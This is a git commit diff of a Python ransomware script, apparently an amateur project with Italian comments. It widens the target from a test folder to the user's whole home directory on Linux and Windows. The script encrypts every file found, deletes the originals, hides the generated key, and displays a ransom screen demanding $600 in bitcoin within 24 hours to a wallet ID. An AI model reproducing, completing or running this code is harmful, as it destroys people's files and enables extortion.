6ba77cd46ed8e3a9a952f15de943777b9aa0767a
Claudio Rimensi <53294518+OriolOriolOriol@users.noreply.github.com>
2020-09-11 23:43:48 +0200

    Add files via upload

--- Ransonware.py
+++ Ransonware.py
@@ -40,10 +40,11 @@ def valida_password(password):
 
 #########CIFRATURA################
 def cifra(filename,password):
-    bufferSize = 64 * 1024
-    key = str(password)
-    pyAesCrypt.encryptFile(filename, filename +".crypt", key, bufferSize)
-    print("File cifrati")
+	print(filename)
+	bufferSize = 64 * 1024
+	key = str(password)
+	pyAesCrypt.encryptFile(filename, filename +".crypt", key, bufferSize)
+	print("File cifrati")
 
 
 
@@ -95,11 +96,11 @@ def decifra():
 ###FUNZIONE PRINCIPALE###############
 if __name__ == '__main__':
     username = getpass.getuser()
-    pattern_linux=f"/home/{username}/Cartella_di_prova/"
-    pattern_windows =f" C:\\Users\\{username}"
+    pattern_linux=f"/home/{username}"
+    pattern_windows =f"C:\\Users\\{username}\\ciao"
     lunghezza = 125
     password_generata = genera_password(lunghezza)
-    print('Password generata: {}'.format(password_generata))
+    #print('Password generata: {}'.format(password_generata))
     piattaforma=platform.system()
     if piattaforma == 'Linux':
         print("La macchina ha su Linux")
@@ -111,49 +112,7 @@ if __name__ == '__main__':
 
         for f in files:
             f=str(f)
-            cifra=cifra(f,password_generata)
-            #os.remove(f)
-            app = Tk()   
-            password = StringVar() #Password variable
-            Input_step = Label(app,text="You are hacked :D You had to make backups my friend.\nDon't close this screen, otherwise you can't able to recover your file", font="Arial 20 bold italic").pack()
-            
-            response = requests.get("https://www.sanita-digitale.com/files/2019/03/hacker.png")
-            load = PIL.Image.open(BytesIO(response.content))
-            render = ImageTk.PhotoImage(load)
-            panel = Label(app, image = render,  width=10, height=10)
-            panel.image = render
-            panel.pack(side = "bottom", fill = "both", expand = "yes")
-
-            myFont2 = font.Font(size=30)   
-            passEntry = Entry(app, textvariable=password, show='*')
-            passEntry['font'] = myFont2
-            passEntry.pack()
-
-            myFont1 = font.Font(size=30)    
-            submit = Button(app, text='Decrypt',command=decifra)
-            submit['font'] = myFont1
-            submit.pack()
-            
-            
-            myFont = font.Font(size=30)   
-            submit2 = Button(app, text='Bitcoin',command=what_is_bitcoin)
-            submit2['font'] = myFont
-            submit2.pack()
-            Input_step1= Label(app, text="\n\n\nIf you want to get your files back send $600 to this wallet in bitcoin within 24 hours otherwise I will delete the decryption key forever.\n\nThis is my wallet ID: d64689ed-d3f1-4c58-b4f2-97da42edab5b",font="Arial 20 bold italic").pack()
-            app.mainloop()
-
-
-    elif piattaforma == 'Windows':
-        print("La macchina ha su Windows")
-        username = getpass.getuser()
-        files = []
-        for r, d, f in os.walk(pattern_windows):
-            for file in f:
-                files.append(os.path.join(r, file))
-
-        for f in files:
-            f=str(f)
-            cifra=cifra(f,password_generata)
+            cifra(f,password_generata)
             os.remove(f)
             app = Tk()   
             password = StringVar() #Password variable
@@ -181,8 +140,51 @@ if __name__ == '__main__':
             submit2 = Button(app, text='Bitcoin',command=what_is_bitcoin)
             submit2['font'] = myFont
             submit2.pack()
-            Input_step1= Label(app, text="\n\n\nIf you want to get your files back send $600 to this wallet in bitcoin within 24 hours otherwise I will delete the decryption key forever.\n\nThis is my wallet ID: d64689ed-d3f1-4c58-b4f2-97da42edab5b",font="Arial 20 bold italic").pack()
+            Input_step1= Label(app, text="\n\n\nIf you want to get your files back\n send $600 to this wallet in bitcoin within 24 hours otherwise I will delete the decryption key forever.\n\nThis is my wallet ID: d64689ed-d3f1-4c58-b4f2-97da42edab5b",font="Arial 20 bold italic").pack()
             app.mainloop()
+
+
+    elif piattaforma == 'Windows':
+        print("La macchina ha su Windows")
+        files = []
+        for r, d, f in os.walk(pattern_windows):
+            for file in f:
+            	files.append(os.path.join(r, file))
+
+        for f in files:
+            f=str(f)
+            print(f)
+            cifra(f,password_generata)
+            os.remove(f)
+
+        app = Tk()   
+        password = StringVar() #Password variable
+        Input_step = Label(app,text="You are hacked :D You had to make backups my friend.\nDon't close this screen, otherwise you can't able to recover your file", font="Arial 20 bold italic").pack()
+        
+        response = requests.get("https://www.sanita-digitale.com/files/2019/03/hacker.png")
+        load = PIL.Image.open(BytesIO(response.content))
+        render = ImageTk.PhotoImage(load)
+        panel = Label(app, image = render,  width=5, height=5)
+        panel.image = render
+        panel.pack(side = "bottom", fill = "both", expand = "yes")
+
+        myFont2 = font.Font(size=30)   
+        passEntry = Entry(app, textvariable=password, show='*')
+        passEntry['font'] = myFont2
+        passEntry.pack()
+
+        myFont1 = font.Font(size=30)    
+        submit = Button(app, text='Decrypt',command=decifra)
+        submit['font'] = myFont1
+        submit.pack()
+        
+        
+        myFont = font.Font(size=30)   
+        submit2 = Button(app, text='Bitcoin',command=what_is_bitcoin)
+        submit2['font'] = myFont
+        submit2.pack()
+        Input_step1= Label(app, text="\n\n\nIf you want to get your files back send $600 to this wallet in bitcoin within 24 hours otherwise I will delete the decryption key forever.\n\nThis is my wallet ID: d64689ed-d3f1-4c58-b4f2-97da42edab5b",font="Arial 20 bold italic").pack()
+        app.mainloop()
 
        
     elif piattaforma == 'Darwin':
